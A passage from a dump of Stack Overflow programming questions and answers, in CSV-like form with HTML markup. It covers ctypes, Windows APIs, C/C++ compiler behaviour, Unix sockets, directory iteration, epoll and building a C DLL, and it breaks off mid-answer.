<a href=""http://www.cosc.canterbury.ac.nz/greg.ewing/python/Pyrex/version/Doc/FAQ.html"" rel=""nofollow"">http://www.cosc.canterbury.ac.nz/greg.ewing/python/Pyrex/version/Doc/FAQ.html</a></p>

<p>Can't really see how that helps though, because afaik that's a cython feature, not a python one.</p>

<p>For the interested, the reason I need to do this is I'm working with panda3d and a kinect, and the kinect c api provides an array of unsigned char * values and the panda3d api lovingly provides a setPixels() call that only takes a python string as an argument.</p>
","9530","","<p>As you said, use a <code>POINTER(c_char)</code> to get a pointer to the array of binary data.  To put that together into a string, you can just take a slice of it, since array indexing works as expected with ctypes pointers:</p>

<pre><code>clibblah = ctypes.cdll.LoadLibrary('clibblah.dylib')
get_pixels = clibblah.get_pixels
get_pixels.restype = ctypes.POINTER(ctypes.c_char)

pixels = get_pixels()
num_pixels = clibblah.get_pixel_length()

# Slice the ctypes array into a Python string
a = pixels[:num_pixels]
</code></pre>
"
"<p>Are there any C++ compile time macros which exists to detect which Windows OS the code is being compiled on. I basically want to support certain functions only on Win7. So I am interested in doing something like this</p>

<pre><code>#if &lt;os_macro&gt; = WIN7
  // This function would do something valid only on Win7 builds.
  bool myfunction {
        // do something here
  }
#else
  // This function would typically return false, since its not supported on OS below win7
  bool myfunction {
       return false;
  }
#endif 
</code></pre>

<p>Is there any other better way to do this?</p>
","9530","","<p>The OS that it's getting <em>compiled</em> on is not all that important; what matters more is the OS that the code is <em>running</em> on, which you obviously cannot detect at compile time.  But if you want your code to run on older versions of Windows, you can set <a href=""http://msdn.microsoft.com/en-us/library/aa383745%28v=vs.85%29.aspx#setting_winver_or__win32_winnt""><code>WINVER</code> and <code>_WIN32_WINNT</code></a> to certain values, which will cause newer functions not to be available etc. (just search the Windows header files for where those macros get tested to get an idea).</p>

<p>To test for functionality at runtime, use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms683212%28v=vs.85%29.aspx""><code>GetProcAddress</code></a> (and possibly also <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx""><code>LoadLibrary</code></a>, if it's in a newer DLL) to test if the function is available.  If it is, call it, if not, don't.</p>

<p>See also the <a href=""http://msdn.microsoft.com/en-us/library/b0084kay.aspx"">predefined macros</a> used by the Visual Studio compiler if you want to detect the compiler version etc.</p>
"
"<p>I am trying to back-port code written for python 2.7 into python 2.6 (the reason is that the server where the code is supposed to run has only python 2.6 and the admin refuses to install python 2.7 or higher).</p>

<p>In general this worked fine, but I found the following problem. In the original code the lines (or something similar):</p>

<pre><code>g = lambda x : ['{:d}'.format(i) for i in x]
g([1,2,3,4])
</code></pre>

<p>worked fine. However, in python 2.6 they produce an error. I couldn't find anything about this  topic on the documentation.</p>

<p>What is the reason? Is there any simple solution to this problem, i.e., a definition of the lambda expression that is equivalent (same semantics) but uses different syntax?</p>
","9530","","<p>In Python 2.6, the field name is required (see <a href=""http://docs.python.org/release/2.6.7/library/string.html#formatstrings"" rel=""nofollow"">Format String Syntax</a>).  In Python 2.7+, <a href=""http://docs.python.org/library/string.html#formatstrings"" rel=""nofollow"">it can be omitted</a>:</p>

<blockquote>
  <p><em>Changed in version 2.7:</em> The positional argument specifiers can be omitted, so <code>'{} {}'</code> is equivalent to <code>'{0} {1}'</code>.</p>
</blockquote>

<p>So if you want your code to be compatible with Python 2.6, write it like so:</p>

<pre><code>g = lambda x : ['{0:d}'.format(i) for i in x]
g([1,2,3,4])
</code></pre>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/1108780/why-do-i-always-get-the-same-sequence-of-random-numbers-with-rand"">why do i always get the same sequence of random numbers with rand()?</a> </p>
</blockquote>

<p>I am confounded by the fact that even using <em>different programs</em> (on the same machine) to run /compile, and after nilling  the vaues (before and after) the function.. that NO MATTER WHAT.. I'll keep getting the SAME ""random"" numbers… each and every time I run it.  I <em>swear</em> this is NOT how it's supposed to work.. I'm going to illustrate as simply as is possible…</p>

<pre><code>#import &lt;Foundation/Foundation.h&gt;
int main(int argc, char *argv[]) {

    int rPrimitive = 0;  rPrimitive = 1 + rand() % 50;
    NSNumber *rObject = nil; rObject = [NSNumber numberWithInt:rand() % 10];
    NSLog(@""%i  %@"", rPrimitive, rObject);

    rPrimitive = 0;   rObject = nil;
    NSLog(@""%i  %@"", rPrimitive, rObject);
    return 0;           
}
</code></pre>

<p>Run it in TextMate:</p>

<pre><code>i686-apple-darwin11-llvm-gcc-4.2
8  9
0  (null)
</code></pre>

<p>Run it in CodeRunner:</p>

<pre><code>i686-apple-darwin11-llvm-gcc-4.2
8  9
0  (null)
</code></pre>

<p>Run it a million times, if you'd like.  You can gues what it will always be.  Why does this happen?  Why oh why is this ""how it is""?</p>
","9530","","<p>Because the numbers aren't random, they're <a href=""http://en.wikipedia.org/wiki/Pseudorandom"" rel=""nofollow"">pseudorandom</a>.  They're generated according to an algorithm which will always produce the same output, given the same initial seed.  You're not seeding the PRNG, so it uses a default, constant seed.</p>

<p>If you seed the PRNG using something less predictable (such as the current time and/or PID), you will get different results each time.  In the case of <a href=""http://linux.die.net/man/3/rand"" rel=""nofollow""><code>rand(3)</code></a>, you need to seed it with <a href=""http://linux.die.net/man/3/rand"" rel=""nofollow""><code>srand(3)</code></a>.</p>
"
"<p>After the release of windows vista the Windows Function <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms679277%28v=vs.85%29.aspx"" rel=""nofollow"">Beep</a> plays a beep on your connected speakers instead of the internal one.</p>

<p>Is there anyway to access the old function? Would it be possible by getting hold in an older windows api? Or is there any other way i can make this possible? If so i would like the ability to set both the frequency and duration.</p>

<p>I should mention that I´m actually targeting the windows xp platform.</p>
","9530","","<p>No.  The function is implemented in a Kernel32.dll, which is loaded at runtime from whatever version of the OS you're currently running.  Since the code isn't there in either your executable or in a system DLL, you can't run it (don't even think about copying over Kernel32.dll from a different OS version, that's just screaming for trouble).</p>

<p>You can try using <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680356%28v=vs.85%29.aspx"" rel=""nofollow""><code>MessageBeep</code></a> instead of <code>Beep</code>, but that gives you less control over the output and will probably still use your sound card instead of the internal </p>

<p>For an interesting history of the <code>MessageBeep</code> function, see <a href=""http://blogs.msdn.com/b/larryosterman/archive/2010/01/04/what-s-up-with-the-beep-driver-in-windows-7.aspx"" rel=""nofollow"">Larry Osterman's blog</a>.</p>
"
"<p>I'm running several scripts which are writing and reading from the same CSV file over a network share. </p>

<p>I'm getting intermittent <code>OSError: [Errno 2] No such file or directory: 'filename.csv'</code> (every minute or two, with writing/reading every 10-30 seconds), but most of the time the file writing/reading works fine.</p>

<p>Is there any way to track which script has the file open when, and get some more details about the error? I.e. is file in use? Is it losing connection to the file server?</p>

<hr>

<h2>Using Process monitor:</h2>

<p><strong>Ordinary operation (no error messages):</strong></p>



<pre class=""lang-none prettyprint-override""><code>2:33:52.4823608 PM  python.exe  2668    IRP_MJ_QUERY_VOLUME_INFORMATION filename.csv    SUCCESS Type: QueryDeviceInformationVolume, DeviceType: Disk, Characteristics: Remote
2:33:52.4823848 PM  python.exe  2668    IRP_MJ_QUERY_VOLUME_INFORMATION filename.csv    SUCCESS Type: QueryDeviceInformationVolume, DeviceType: Disk, Characteristics: Remote
2:33:52.4824062 PM  python.exe  2668    IRP_MJ_QUERY_VOLUME_INFORMATION filename.csv    BUFFER OVERFLOW Type: QueryInformationVolume, VolumeCreationTime: 1/1/1601 8:00:00 AM, VolumeSerialNumber: D020-FD78, SupportsObjects: False, VolumeLabel: DAT`
2:33:52.4827061 PM  python.exe  2668    IRP_MJ_QUERY_INFORMATION        filename.csv    BUFFER OVERFLOW Type: QueryAllInformationFile, CreationTime: 4/24/2012 2:36:07 PM, LastAccessTime: 4/24/2012 2:36:07 PM, LastWriteTime: 4/24/2012 2:36:07 PM, ChangeTime: 4/24/2012 2:36:07 PM, FileAttributes: A, AllocationSize: 1,048,576, EndOfFile: 118,342, NumberOfLinks: 1, DeletePending: False, Directory: False, IndexNumber: 0x45060de, EaSize: 0, Access: None, Position: 0, Mode: , AlignmentRequirement: Byte
2:33:52.4837725 PM  python.exe  2668    FASTIO_QUERY_INFORMATION        filename.csv    FAST IO DISALLOWED  Type: QueryStandardInformationFile
2:33:52.4837820 PM  python.exe  2668    IRP_MJ_QUERY_INFORMATION        filename.csv    SUCCESS Type: QueryStandardInformationFile, AllocationSize: 1,048,576, EndOfFile: 118,342, NumberOfLinks: 1, DeletePending: False, Directory: False
2:33:52.4841324 PM  python.exe  2668    FASTIO_QUERY_INFORMATION        filename.csv    FAST IO DISALLOWED  Type: QueryStandardInformationFile
2:33:52.4841458 PM  python.exe  2668    IRP_MJ_QUERY_INFORMATION        filename.csv    SUCCESS Type: QueryStandardInformationFile, AllocationSize: 1,048,576, EndOfFile: 118,342, NumberOfLinks: 1, DeletePending: False, Directory: False
2:33:52.4844948 PM  python.exe  2668    IRP_MJ_READ                     filename.csv    SUCCESS Offset: 117,318, Length: 1,024
2:33:52.4857179 PM  python.exe  2668    IRP_MJ_READ                     filename.csv    END OF FILE Offset: 118,342, Length: 4,096
2:33:52.4862472 PM  python.exe  2668    FASTIO_QUERY_INFORMATION        filename.csv    FAST IO DISALLOWED  Type: QueryStandardInformationFile
2:33:52.4862564 PM  python.exe  2668    IRP_MJ_QUERY_INFORMATION        filename.csv    SUCCESS Type: QueryStandardInformationFile, AllocationSize: 1,048,576, EndOfFile: 118,342, NumberOfLinks: 1, DeletePending: False, Directory: False
2:33:52.4867251 PM  python.exe  2668    IRP_MJ_READ                     filename.csv    SUCCESS Offset: 116,294, Length: 1,024
2:33:52.4873473 PM  python.exe  2668    IRP_MJ_READ                     filename.csv    SUCCESS Offset: 117,318, Length: 512
2:33:52.4878825 PM  python.exe  2668    FASTIO_QUERY_INFORMATION        filename.csv    FAST IO DISALLOWED  Type: QueryStandardInformationFile
2:33:52.4878917 PM  python.exe  2668    IRP_MJ_QUERY_INFORMATION        filename.csv    SUCCESS Type: QueryStandardInformationFile, AllocationSize: 1,048,576, EndOfFile: 118,342, NumberOfLinks: 1, DeletePending: False, Directory: False
2:33:52.4882153 PM  python.exe  2668    IRP_MJ_READ                     filename.csv    SUCCESS Offset: 115,270, Length: 1,024
2:33:52.4889601 PM  python.exe  2668    IRP_MJ_READ                     filename.csv    SUCCESS Offset: 116,294, Length: 512
2:33:52.4895164 PM  python.exe  2668    IRP_MJ_CLEANUP                  filename.csv    SUCCESS 
2:33:52.4895513 PM  python.exe  2668    IRP_MJ_CLOSE                    filename.csv    SUCCESS 
</code></pre>

<p><strong>File open in another program (Errno 13 - Permission Denied):</strong></p>

<pre class=""lang-none prettyprint-override""><code>1:12:42.0840918 PM  python.exe  5772    IRP_MJ_CREATE   filename.csv    SHARING VIOLATION   Desired Access: Generic Write, Read Attributes, Disposition: OpenIf, Options: Synchronous IO Non-Alert, Non-Directory File, Attributes: N, ShareMode: Read, Write, AllocationSize: 0
</code></pre>

<p><strong>Misc error</strong> (not sure if this corresponds to a python error or not)</p>

<pre class=""lang-none prettyprint-override""><code>2:57:59.9371101 PM  python.exe  3584    IRP_MJ_CREATE   filename.log    BAD NETWORK PATH    Desired Access: Generic Read, Disposition: Open, Options: Synchronous IO Non-Alert, Non-Directory File, Attributes: N, ShareMode: Read, Write, AllocationSize: n/a
</code></pre>

<p>Would this show as an OSError 2?</p>
","9530","","<p>If you're on Windows, use <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896645"" rel=""nofollow"">Process Monitor</a> to record all of the file operations done by Python.exe processes.  If you're on Mac OS X or Solaris, use <a href=""http://dtrace.org/blogs/about/"" rel=""nofollow"">DTrace</a>.  If you're on Linux, use <a href=""http://linux.die.net/man/1/strace"" rel=""nofollow"">strace</a>.</p>

<p>Any of those tools will give you a detailed listing of all of the system calls being made, along with their return codes, allowing you to narrow down what's failing and perhaps why.</p>
"
"<p>From the book - C++ Templates: The Complete Guide by David, Nicolai</p>

<blockquote>
  <p>Thus, templates are compiled twice:</p>
  
  <ol>
  <li>Without instantiation, the template code itself is checked for correct syntax. Syntax errors are discovered, such as missing
  semicolons.</li>
  <li>At the time of instantiation, the template code is checked to ensure that all calls are valid. Invalid calls are discovered, such as
  unsupported function calls.</li>
  </ol>
</blockquote>

<p>Keeping the first point, I wrote -</p>

<pre><code>template&lt;typename T&gt;
void foo( T x)
{
   some illegal text
}

int main()
{
   return 0;
}
</code></pre>

<p>It build fine on Visual Studio 2010 with out any warnings with optimizations turned off. How ever, <a href=""http://ideone.com/TJK6y"" rel=""nofollow"">it failed on gcc-4.3.4</a>. Which one is complying to the C++ standard ? Is it mandatory for template code to get compiled even with out template instantiation ?</p>
","9530","","<p>The program in question is ill-formed, but the C++ standard does not require a diagnostic in this case, so both Visual Studio and GCC are behaving in a compliant fashion.  From §14.6/7 of the C++03 standard (emphasis mine):</p>

<blockquote>
  <p>Knowing which names are type names allows the syntax of every template definition to be checked. No
  diagnostic shall be issued for a template definition for which a valid specialization can be generated. <strong>If no
  valid specialization can be generated for a template definition, and that template is not instantiated, the template
  definition is ill-formed, no diagnostic required.</strong> If a type used in a non-dependent name is incomplete
  at the point at which a template is defined but is complete at the point at which an instantiation is done, and
  if the completeness of that type affects whether or not the program is well-formed or affects the semantics
  of the program, the program is ill-formed; no diagnostic is required. [<em>Note:</em> if a template is instantiated,
  errors will be diagnosed according to the other rules in this Standard. Exactly when these errors are diagnosed
  is a quality of implementation issue. ] [<em>Example:</em></p>

<pre><code>int j;
template&lt;class T&gt; class X {
    // ...
    void f(T t, int i, char* p)
    {
        t = i; // diagnosed if X::f is instantiated
               // and the assignment to t is an error
        p = i; // may be diagnosed even if X::f is
               // not instantiated
        p = j; // may be diagnosed even if X::f is
               // not instantiated
    }
    void g(T t) {
        +; //may be diagnosed even if X::g is
           // not instantiated
    }
};
</code></pre>
  
  <p>—<em>end example</em>]</p>
</blockquote>
"
"<p>I have a C API that defines an enum like so:</p>

<pre><code>typedef enum
{
  C_ENUM_VALUE_NONE    = 0,
  C_ENUM_VALUE_APPLE   = (1 &lt;&lt; 0),
  C_ENUM_VALUE_BANANA  = (1 &lt;&lt; 1),
  C_ENUM_VALUE_COCONUT = (1 &lt;&lt; 2),
  // etc.
  C_ENUM_VALUE_ANY     = ~0
} CEnumType;
</code></pre>

<p>There is a method that uses the enum, defined as:</p>

<pre><code>void do_something(CEnumType types);
</code></pre>

<p>In C, you can call something like:</p>

<pre><code>do_something(C_ENUM_VALUE_APPLE | C_ENUM_VALUE_BANANA);
</code></pre>

<p>However, if you try to call it this way in C++ (Linux, g++ compiler), you get an error, <em>invalid conversion from ‘int’ to ‘CEnumType’</em>.</p>

<p><strong>What is the correct way to use this C API from my C++ application?</strong></p>
","9530","","<p>C++ has stricter rules than C regarding enums.  You'll need to cast the value to the enumeration type when calling:</p>

<pre><code>do_something((CEnumType)(C_ENUM_VALUE_APPLE | C_ENUM_VALUE_BANANA));
</code></pre>

<p>Alternatively, you can writer a wrapper function that takes an <code>int</code> to do the cast for you, if you want to avoid writing the cast every time you call it:</p>

<pre><code>void do_something_wrapper(int types)
{
    do_something((CEnumType)types);
}
...
do_something_wrapper(C_ENUM_VALUE_APPLE | C_ENUM_VALUE_BANANA);
</code></pre>

<p>Though I don't know if I want to see what you get when you cross an apple with a banana...</p>
"
"<p>The following unix domain socket client and server example from <a href=""http://www.thomasstover.com/uds.html"" rel=""nofollow"">http://www.thomasstover.com/uds.html</a> does not work as expected on my slackware linux box.  I get this output:</p>

<pre><code>$ ./server1 
$

$ ./client1 
MESSAGE FROM SERVER: hello from a client
</code></pre>

<p>I expected the server to print the message hello from client and the client to print hello from server.</p>

<p>My OS and compiler are as these:</p>

<pre><code>$ uname -a                                                                                                    
Linux temeraire 2.6.37.6-smp #2 SMP Sat Apr 9 23:39:07 CDT 2011 i686 Intel(R) Xeon(R) CPU           E3110  @ 3.00GHz Ge
nuineIntel GNU/Linux
$ gcc -v
Reading specs from /usr/lib/gcc/i486-slackware-linux/4.5.2/specs
COLLECT_GCC=gcc
COLLECT_LTO_WRAPPER=/usr/libexec/gcc/i486-slackware-linux/4.5.2/lto-wrapper
Target: i486-slackware-linux
Configured with: ../gcc-4.5.2/configure --prefix=/usr --libdir=/usr/lib --mandir=/usr/man --infodir=/usr/info --enable-
shared --enable-bootstrap --enable-languages=ada,c,c++,fortran,java,objc,lto --enable-threads=posix --enable-checking=r
elease --with-system-zlib --with-python-dir=/lib/python2.6/site-packages --disable-libunwind-exceptions --enable-__cxa_
atexit --enable-libssp --enable-lto --with-gnu-ld --verbose --with-arch=i486 --target=i486-slackware-linux --build=i486
-slackware-linux --host=i486-slackware-linux
Thread model: posix
gcc version 4.5.2 (GCC) 
</code></pre>

<p>server.c:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/un.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

int connection_handler(int connection_fd)
{
 int nbytes;
 char buffer[256];

 nbytes = read(connection_fd, buffer, 256);
 buffer[nbytes] = 0;

 printf(""MESSAGE FROM CLIENT: %s\n"", buffer);
 nbytes = snprintf(buffer, 256, ""hello from the server"");
 write(connection_fd, buffer, nbytes);

 close(connection_fd);
 return 0;
}

int main(void)
{
 struct sockaddr_un address;
 int socket_fd, connection_fd;
 socklen_t address_length;
 pid_t child;

 socket_fd = socket(PF_UNIX, SOCK_STREAM, 0);
 if(socket_fd &lt; 0)
 {
  printf(""socket() failed\n"");
  return 1;
 } 

 unlink(""./demo_socket"");

 /* start with a clean address structure */
 memset(&amp;address, 0, sizeof(struct sockaddr_un));

 address.sun_family = AF_UNIX;
 snprintf(address.sun_path, UNIX_PATH_MAX, ""./demo_socket"");

 if(bind(socket_fd, 
         (struct sockaddr *) &amp;address, 
         sizeof(struct sockaddr_un)) != 0)
 {
  printf(""bind() failed\n"");
  return 1;
 }

 if(listen(socket_fd, 5) != 0)
 {
  printf(""listen() failed\n"");
  return 1;
 }

 while((connection_fd = accept(socket_fd, 
                               (struct sockaddr *) &amp;address,
                               &amp;address_length)) &gt; -1)
 {
  child = fork();
  if(child == 0)
  {
   /* now inside newly created connection handling process */
   return connection_handler(connection_fd);
  }

  /* still inside server process */
  close(connection_fd);
 }

 close(socket_fd);
 unlink(""./demo_socket"");
 return 0;
}
</code></pre>

<p>client.c:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/un.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

int main(void)
{
 struct sockaddr_un address;
 int  socket_fd, nbytes;
 char buffer[256];

 socket_fd = socket(PF_UNIX, SOCK_STREAM, 0);
 if(socket_fd &lt; 0)
 {
  printf(""socket() failed\n"");
  return 1;
 }

 /* start with a clean address structure */
 memset(&amp;address, 0, sizeof(struct sockaddr_un));

 address.sun_family = AF_UNIX;
 snprintf(address.sun_path, UNIX_PATH_MAX, ""./demo_socket"");

 if(connect(socket_fd, 
            (struct sockaddr *) &amp;address, 
            sizeof(struct sockaddr_un)) != 0)
 {
  printf(""connect() failed\n"");
  return 1;
 }

 nbytes = snprintf(buffer, 256, ""hello from a client"");
 write(socket_fd, buffer, nbytes);

 nbytes = read(socket_fd, buffer, 256);
 buffer[nbytes] = 0;

 printf(""MESSAGE FROM SERVER: %s\n"", buffer);

 close(socket_fd);

 return 0;
}
</code></pre>
","9530","","<p>As <a href=""http://stackoverflow.com/questions/10359067/unix-domain-sockets-on-linux#comment-13348678"">Dietrich Epp mentioned</a>, you're failing to initialize the <code>address_length</code> parameter that gets passed to <code>accept</code> in the server code.  According to the <a href=""http://linux.die.net/man/2/accept"" rel=""nofollow"">man page</a>, this parameter is both an input and output parameter: on input, you tell it how big your address structure is (so that it knows not to write memory out of bounds when telling you the address of the connecting client), and on output it tells you how big the address actually was.</p>

<p>To fix the problem, initialize <code>address_length</code> to <code>sizeof(address)</code> before calling <code>accept</code>.  You also should do this for every call to <code>accept</code>, since the variable could be modified.  For example:</p>

<pre><code>while(1)
{
  address_length = sizeof(address);
  if((connection_fd = accept(..., &amp;address_length)) == -1)
  {
    printf(""accept error: %s\n"", strerror(errno));
    break;
  }
  ...
}
</code></pre>

<p>I was able to reproduce your problem be explicitly initializing <code>address_length</code> to an invalid value of (<code>sockaddr_t)-1</code>, which caused <code>accept</code> to fail with the <code>EINVAL</code> error (invalid parameter), though oddly it didn't fail until after the client tried to connect.  When the client tried to connect, it actually succeeded, but then when it attempted to write to the socket, that failed with <code>ECONNRESET</code> (""Connection reset by peer"").  </p>

<p>Another key point is that you should always check your return values.  When dealing with socket code, there are a lot of points of failure, so it pays to be pedantic.  If a system call fails, it'll return -1 and set <code>errno</code> to an appropriate value.  You can use the <a href=""http://linux.die.net/man/3/strerror"" rel=""nofollow""><code>strerror</code> function</a> to convert error codes into human-readable messages, as I did in the example above.</p>
"
"<p>I'd like to install the latest clang (3.1) compiler using macports (I use emacs rather than xcode, and the version of clang that comes with xcode is older anyway). macports seems to have the latest versions of gcc, but when I enter ""port list clang"" the only version that shows up is 2.9. I use the C++11 features, so I want to use the latest version.</p>

<p>I'm running snow leopard on an MBP.</p>
","9530","","<p>Clang has several different versions available on MacPorts:</p>

<pre><code>$ port search clang

clang @2.9 (lang)
    C, C++, Objective C and Objective C++ compiler

clang-2.9 @2.9 (lang)
    C, C++, Objective C and Objective C++ compiler

clang-3.0 @3.0 (lang)
    C, C++, Objective C and Objective C++ compiler

clang-3.1 @3.1-r154872 (lang)
    C, C++, Objective C and Objective C++ compiler

clang-devel @3.0 (lang)
    C, C++, Objective C and Objective C++ compiler

clang_select @0.1 (sysutils)
    common files for selecting default clang version

Found 6 ports.
</code></pre>

<p>So if you just install the <code>clang</code> port, it'll install version 2.9.  If you want 3.1, install the <code>clang-3.1</code> port.  You can also install <code>clang_select</code>, which is a utility that allows you to easily switch between multiple installations of Clang; without it, you have to manually specify the version of the Clang binary you want each time.</p>
"
"<p>I want to check to see if a file is a directory, link, or just a regular file. I loop through the directory and save each file as <code>struct dirent *</code>. I try to pass <code>d_ino</code> to <code>S_ISDIR(m)</code>, <code>S_ISLINK(m)</code>, or <code>S_ISREG(m)</code> and regardless of the file, I will not get a positive result. So my question is: how do I use <code>S_ISDIR(m)</code> with <code>struct dirent</code>?</p>
","9530","","<p>When you read a directory using <a href=""http://linux.die.net/man/3/readdir"" rel=""nofollow""><code>readdir(3)</code></a>, the file type is stored in the <code>d_type</code> member variable of each <code>struct dirent</code> you receive, not the <code>d_ino</code> member.  You rarely will care about the inode number.</p>

<p>However, not all implementations will have valid data for the <code>d_type</code> member, so you may need to call <a href=""http://linux.die.net/man/3/stat"" rel=""nofollow""><code>stat(3)</code></a> or <a href=""http://linux.die.net/man/3/lstat"" rel=""nofollow""><code>lstat(3)</code></a> on each file to determine its file type (use <code>lstat</code> if you're interested in symbolic links, or use <code>stat</code> if you're interested in the targets of symbolic links) and then examine the <code>st_mode</code> member using the <code>S_IS***</code> macros.</p>

<p>A typical directory iteration might look like this:</p>

<pre><code>// Error checking omitted for expository purposes
DIR *dir = opendir(dir_to_read);
struct dirent *entry;

while((entry = readdir(dir)) != NULL)
{
    struct stat st;
    char filename[512];
    snprintf(filename, sizeof(filename), ""%s/%s"", dir_to_read, entry-&gt;d_name);
    lstat(filename, &amp;st);

    if(S_ISDIR(st.st_mode))
    {
        // This directory entry is another directory
    }
    else if(S_ISLINK(st.st_mode))
    {
        // This entry is a symbolic link
    }
    else if(S_ISREG(st.st_mode))
    {
        // This entry is a regular file
    }
    // etc.
}

closedir(dir);
</code></pre>
"
"<p>There is a <a href=""http://linux.die.net/man/2/epoll_wait"" rel=""nofollow"">void pointer</a> in the epoll event structure. I am malloc-ing memory for this and using it elsewhere. Now when I want to take the FD off the epoll list, will this pointer be freed by itself? (A logical thought chain would be that the event structure is maintained internally, possibly by the kernel. So it would free the event strucutre and the memory allocated to the pointer too) Or would I have to free it explicitly?</p>

<p>P.S. I saw a piece of code that does not free the memory allocated to the pointer. I feel that it should be freed explicitly.  </p>
","9530","","<p>No, the pointer will not be freed by itself.  As far as the kernel is concerned, it's just an opaque value which it doesn't know how to deal with.  It doesn't know if it's a pointer into the stack, heap, data segment, or something else entirely.  So it couldn't possibly know that it should <code>free()</code> it.</p>

<p>The basic rule is, unless the documentation explicitly says otherwise, you are responsible for <code>free</code>ing any memory you <code>malloc</code>.  So, when you remove a file descriptor from an epoll list, you also need to <code>free</code> the corresponding pointer you <code>malloc</code>ed.</p>
"
"<p>I have this </p>

<pre><code>static std::string exec(char* cmd) {
            FILE* pipe = _popen(cmd, ""r"");
            if (!pipe) return ""ERROR -22"";
            char buffer[128];
            std::string result = """";
            while(!feof(pipe)) {
                if(fgets(buffer, 128, pipe) != NULL)
                        result += buffer;
            }
            _pclose(pipe);
            return result;
</code></pre>

<p>}</p>

<p>But the problem i have is that i want to hide the program that lunches how can I do that? thx</p>
","9530","","<p>As Hans Passant mentioned in the comments, you have to use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425%28v=vs.85%29.aspx"" rel=""nofollow""><code>CreateProcess</code></a> to spawn the child process instead of <code>_popen</code>, since <code>_popen</code> does not give you any control over the window creation process.</p>

<p>To hide the console window, use the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684863%28v=vs.85%29.aspx"" rel=""nofollow""><code>CREATE_NO_WINDOW</code></a> process creation flag for the <code>dwCreationFlags</code> parameter.</p>

<p>In order to capture the output of the process, you need to create a pipe for its standard output stream with <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa365152%28v=vs.85%29.aspx"" rel=""nofollow""><code>CreatePipe</code></a>.  Assign that pipe handle to the <code>hStdOutput</code> member of the <code>STARTUPINFO</code> structure you pass in, and make sure to set the <code>STARTF_USESTDHANDLES</code> flag in the startup info's <code>dwFlags</code> so it knows that that member is valid.  Then, to read data, you just use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa365467%28v=vs.85%29.aspx"" rel=""nofollow""><code>ReadFile</code></a> on the pipe handle.</p>

<p>Hans also provided a link to a good example of creating pipes with a child process <a href=""http://msdn.microsoft.com/en-us/library/ms682499.aspx"" rel=""nofollow"">here</a>, although that example is doing more than you need to do—it's creating pipes for all three streams (stdin, stdout, and stderr), whereas you only need to capture stdout.</p>
"
"<p>How to get list of gamecenter friends who are playing my game in iphone.</p>
","9530","","<p>Use <a href=""http://developer.apple.com/library/ios/#DOCUMENTATION/GameKit/Reference/GKLocalPlayer_Ref/Reference/Reference.html#//apple_ref/doc/uid/TP40009587"" rel=""nofollow""><code>-[GKLocalPlayer loadFriendsWithCompletionHandler:]</code></a>.  For example (untested code):</p>

<pre><code>[[GKLocalPlayer localPlayer] loadFriendsWithCompletionHandler:
    ^(NSArray *friends, NSError *error)
    {
        if (error)
        {
            // Handle error
        }
        else
        {
            // friends is an array of player identifiers of the user's friends
            // Now would be a good time to copy or retain it.
        }
    } ];
</code></pre>
"
"<p>As per title, I'm trying to build a DLL using C and link it from a C++ project. I read and followed different tutorials on internet but everytime there is something missing and I don't understand what. </p>

<p>Here's what I did, step by step: </p>

<p>I created a new Win32 project, named <code>testlib</code>, then, from the wizard, I chose ""DLL"" and ""Empty project"".</p>

<p>Added a header: </p>

<pre><code>//testlib.h

#include &lt;stdio.h&gt;

__declspec(dllexport) void hello();
</code></pre>

<p>Added a source; since I want it to be a C source I read I should simplly rename the .cpp file in .c, so</p>

<pre><code>//testlib.c

#include ""testlib.h""

void hello() {
    printf(""DLL hello() called\n"");
}
</code></pre>

<p>Build succeded. </p>

<p>Now I would like to use my useful dll in another project. </p>

<p>Then: new project (<code>testlibUse</code>). This time I selected ""Empty project"". <br>
No need to add an header, just created a cpp source</p>

<pre><code>//main.cpp
#include &lt;testlib.h&gt;

int main() {
    hello();
}
</code></pre>

<p>Then:</p>

<ul>
<li><p>I added the path to the folder where is <code>testlib.dll</code> in Properties->VC++ directories->Executable directories</p></li>
<li><p>I added the path to the folder where is <code>testlib.h</code> in Properties->VC++ directories->Include directories</p></li>
<li><p>I added the path to <code>testlib.lib</code> (included extension) in Properties->Linker->Input->Additional dependencies</p></li>
</ul>

<p>I tried to build but I got a linker error:</p>

<blockquote>
  <p>LINK : C:\path\testlibUse\Debug\testlibUse.exe not found or not built by the last incremental link; performing full link<br>
  main.obj : error LNK2019: unresolved external symbol ""void __cdecl hello(void)"" (?hello@@YAXXZ) referenced in function _main<br>
  C:\path\testlibUse\Debug\testlibUse.exe : fatal error LNK1120: 1 unresolved externals </p>
</blockquote>

<p>If I go back to <code>testlib</code>, rename back <code>testlib.c</code> in <code>testlib.cpp</code> and rebuild the dll, then I am able to build <code>testlibUse</code> but I get a ""dll not found"" error at runtime.</p>

<p>I tried also to change the configurations of both projects in ""Release"" (changing the path where needed), but nothing changed.</p>

<p>Sorry for the long post but I think it was necessary to write down exactly what I did.</p>

<p>Any suggestions?</p>

<p>Besides, are there any configuration parameters I need to change if I want to use my dll in a Qt project? </p>
","9530","","<p>You have several problems:</p>

<ol>
<li>The header file should mark the functions as exported when being compiled in the DLL but imported when being compiled by a library user.</li>
<li>The header file should wrap the function declarations in an <code>extern ""C""</code> block when being compiled as C++ to ensure that the names do not get mangled</li>
<li>The DLL is not on your executable's library search path, so it can't be found at runtime.</li>
</ol>

<p>To fix (1) and (2), rewrite your header like this:</p>

<pre><code>#ifdef __cplusplus
extern ""C"" {
#endif

// Assume this symbol is only defined by your DLL project, so we can either
// export or import the symbols as appropriate
#if COMPILING_MY_TEST_DLL
#define TESTLIB_EXPORT __declspec(dllexport)
#else
